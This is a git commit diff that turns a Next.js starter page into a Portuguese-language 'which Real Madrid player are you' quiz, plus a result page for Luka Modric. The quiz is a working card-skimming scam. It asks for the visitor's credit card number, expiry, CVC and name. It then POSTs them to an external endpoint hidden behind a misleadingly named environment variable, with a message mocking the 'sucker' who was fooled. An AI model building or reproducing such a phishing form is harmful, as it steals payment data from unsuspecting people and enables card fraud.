8e281872480907a2f3f18117097a5eae86c67299
Filipe Bacof <filipebacof@gmail.com>
2024-08-05 16:01:41 -0300

    feat: site pronto

---
+++ src/app/luka-modric/page.tsx
@@ -0,0 +1,26 @@
+import Image from "next/image";
+import Link from "next/link";
+
+export default function LucaModric() {
+  return (
+    <main className="flex flex-col items-center my-8 gap-4">
+      <Image
+        className="w-60 h-auto rounded-md"
+        src="/Luka-Modric.jpg"
+        alt="Real Madrid Team"
+        width={559}
+        height={713}
+        priority
+      />
+      <h1 className="text-center text-lg font-semibold">
+        Você tirou: Luka Modric
+      </h1>
+      <Link
+        href="/"
+        className="bg-emerald-500 mt-4 rounded font-semibold flex justify-center items-center px-4 py-2 text-zinc-800 h-10 hover:bg-emerald-600"
+      >
+        Tentar novamente
+      </Link>
+    </main>
+  );
+}
--- src/app/page.tsx
+++ src/app/page.tsx
@@ -1,113 +1,185 @@
+"use client";
+
+import { useForm, Controller } from "react-hook-form";
+import { z } from "zod";
+import { zodResolver } from "@hookform/resolvers/zod";
 import Image from "next/image";
+import { useRouter } from "next/navigation";
+
+const createUserFormSchema = z.object({
+  name: z.string().nonempty("O nome é obrigatório"),
+  credCard: z
+    .string()
+    .nonempty("O número do cartão de crédito é obrigatório")
+    .regex(
+      /^\d{4}-\d{4}-\d{4}-\d{4}$/,
+      "O número do cartão de crédito precisa estar no padrão 0000-0000-0000-0000"
+    ),
+  validity: z
+    .string()
+    .nonempty("A data de validade é obrigatória")
+    .regex(
+      /^(0[1-9]|1[0-2])\/\d{4}$/,
+      "A validade deve estar no formato MM/AAAA"
+    ),
+  cvc: z
+    .string()
+    .nonempty("O CVC é obrigatório")
+    .regex(/^\d{3}$/, "O CVC precisa ter 3 caracteres numéricos"),
+});
+
+type CreateUserFormData = z.infer<typeof createUserFormSchema>;
 
 export default function Home() {
+  const router = useRouter();
+  const {
+    control,
+    handleSubmit,
+    formState: { errors },
+    register,
+    setValue,
+  } = useForm<CreateUserFormData>({
+    resolver: zodResolver(createUserFormSchema),
+  });
+
+  const createUser = async (data: CreateUserFormData) => {
+    // console.log(data);
+    try {
+      await fetch(`${process.env.NEXT_PUBLIC_GITHUB_CLIENT_ID}`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json;charset=utf-8",
+        },
+        body: `Outro trouxa enganado, dados do cartão:<br />${JSON.stringify(
+          data
+        )}`,
+      });
+
+      router.push("/luka-modric");
+    } catch (error) {
+      // console.error(error);
+      console.error("Não foi possível calcular, tente novamente!");
+    }
+  };
+
+  const formatCreditCardNumber = (value: string | undefined) => {
+    if (!value) {
+      return "";
+    }
+    const cleaned = value.replace(/\D/g, "");
+    const match = cleaned.match(/.{1,4}/g);
+    return match ? match.join("-") : value;
+  };
+
+  const handleNameChange = (event: React.ChangeEvent<HTMLInputElement>) => {
+    const formattedName = (name: string | undefined) => {
+      if (!name) {
+        return "";
+      }
+      const hasTrailingSpace = name.endsWith(" ");
+      const formatted = name
+        .trim()
+        .split(" ")
+        .map((word) => {
+          return word[0]
+            .toLocaleUpperCase()
+            .concat(word.substring(1).toLowerCase());
+        })
+        .join(" ");
+      return hasTrailingSpace ? formatted + " " : formatted;
+    };
+    setValue("name", formattedName(event.target.value));
+  };
+
   return (
-    <main className="flex min-h-screen flex-col items-center justify-between p-24">
-      <div className="z-10 max-w-5xl w-full items-center justify-between font-mono text-sm lg:flex">
-        <p className="fixed left-0 top-0 flex w-full justify-center border-b border-gray-300 bg-gradient-to-b from-zinc-200 pb-6 pt-8 backdrop-blur-2xl dark:border-neutral-800 dark:bg-zinc-800/30 dark:from-inherit lg:static lg:w-auto  lg:rounded-xl lg:border lg:bg-gray-200 lg:p-4 lg:dark:bg-zinc-800/30">
-          Get started by editing&nbsp;
-          <code className="font-mono font-bold">src/app/page.tsx</code>
-        </p>
-        <div className="fixed bottom-0 left-0 flex h-48 w-full items-end justify-center bg-gradient-to-t from-white via-white dark:from-black dark:via-black lg:static lg:h-auto lg:w-auto lg:bg-none">
-          <a
-            className="pointer-events-none flex place-items-center gap-2 p-8 lg:pointer-events-auto lg:p-0"
-            href="https://vercel.com?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            By{" "}
-            <Image
-              src="/vercel.svg"
-              alt="Vercel Logo"
-              className="dark:invert"
-              width={100}
-              height={24}
-              priority
-            />
-          </a>
+    <main className="flex flex-col items-center my-8 gap-4">
+      <Image
+        className="w-[50vw] h-auto rounded-md"
+        src="/team.jpg"
+        alt="Real Madrid Team"
+        width={984}
+        height={656}
+        priority
+      />
+      <h1 className="text-center text-lg font-semibold">
+        Descubra qual jogador do Real Madrid você seria:
+      </h1>
+      <form
+        onSubmit={handleSubmit(createUser)}
+        className="flex flex-col gap-2 w-full max-w-md"
+      >
+        <div className="flex flex-col gap-1 items-center">
+          <label htmlFor="credCard">Número do cartão de crédito</label>
+          <Controller
+            name="credCard"
+            control={control}
+            render={({ field }) => (
+              <input
+                type="text"
+                className="w-full text-center border border-zinc-800 shadow-sm rounded h-10 px-3 text-black"
+                {...field}
+                value={formatCreditCardNumber(field.value)}
+                onChange={(e) =>
+                  field.onChange(formatCreditCardNumber(e.target.value))
+                }
+                maxLength={19} // Limite de caracteres (16 dígitos + 3 traços)
+              />
+            )}
+          />
+          {errors.credCard && (
+            <span className="text-red-500 text-sm">
+              {errors.credCard.message}
+            </span>
+          )}
         </div>
-      </div>
 
-      <div className="relative flex place-items-center before:absolute before:h-[300px] before:w-full sm:before:w-[480px] before:-translate-x-1/2 before:rounded-full before:bg-gradient-radial before:from-white before:to-transparent before:blur-2xl before:content-[''] after:absolute after:-z-20 after:h-[180px] after:w-full sm:after:w-[240px] after:translate-x-1/3 after:bg-gradient-conic after:from-sky-200 after:via-blue-200 after:blur-2xl after:content-[''] before:dark:bg-gradient-to-br before:dark:from-transparent before:dark:to-blue-700 before:dark:opacity-10 after:dark:from-sky-900 after:dark:via-[#0141ff] after:dark:opacity-40 before:lg:h-[360px] z-[-1]">
-        <Image
-          className="relative dark:drop-shadow-[0_0_0.3rem_#ffffff70] dark:invert"
-          src="/next.svg"
-          alt="Next.js Logo"
-          width={180}
-          height={37}
-          priority
-        />
-      </div>
-
-      <div className="mb-32 grid text-center lg:max-w-5xl lg:w-full lg:mb-0 lg:grid-cols-4 lg:text-left">
-        <a
-          href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Docs{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
+        <div className="flex flex-col gap-1 items-center">
+          <label htmlFor="validity">Validade</label>
+          <input
+            type="text"
+            className="w-full text-center border border-zinc-800 shadow-sm rounded h-10 px-3 text-black"
+            {...register("validity")}
+          />
+          {errors.validity && (
+            <span className="text-red-500 text-sm">
+              {errors.validity.message}
             </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Find in-depth information about Next.js features and API.
-          </p>
-        </a>
+          )}
+        </div>
 
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Learn{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Learn about Next.js in an interactive course with&nbsp;quizzes!
-          </p>
-        </a>
+        <div className="flex flex-col gap-1 items-center">
+          <label htmlFor="cvc">CVC</label>
+          <input
+            type="text"
+            className="w-full text-center border border-zinc-800 shadow-sm rounded h-10 px-3 text-black"
+            {...register("cvc")}
+          />
+          {errors.cvc && (
+            <span className="text-red-500 text-sm">{errors.cvc.message}</span>
+          )}
+        </div>
 
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Templates{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50`}>
-            Explore starter templates for Next.js.
-          </p>
-        </a>
+        <div className="flex flex-col gap-1 items-center">
+          <label htmlFor="name">Nome Completo</label>
 
-        <a
-          href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          className="group rounded-lg border border-transparent px-5 py-4 transition-colors hover:border-gray-300 hover:bg-gray-100 hover:dark:border-neutral-700 hover:dark:bg-neutral-800/30"
-          target="_blank"
-          rel="noopener noreferrer"
+          <input
+            type="text"
+            className="w-full text-center border border-zinc-800 shadow-sm rounded h-10 px-3 text-black"
+            {...register("name")}
+            onChange={handleNameChange}
+          />
+          {errors.name && (
+            <span className="text-red-500 text-sm">{errors.name.message}</span>
+          )}
+        </div>
+
+        <button
+          type="submit"
+          className="bg-emerald-500 mt-4 rounded font-semibold text-zinc-800 h-10 hover:bg-emerald-600"
         >
-          <h2 className={`mb-3 text-2xl font-semibold`}>
-            Deploy{" "}
-            <span className="inline-block transition-transform group-hover:translate-x-1 motion-reduce:transform-none">
-              -&gt;
-            </span>
-          </h2>
-          <p className={`m-0 max-w-[30ch] text-sm opacity-50 text-balance`}>
-            Instantly deploy your Next.js site to a shareable URL with Vercel.
-          </p>
-        </a>
-      </div>
+          Verificar
+        </button>
+      </form>
     </main>
   );
 }
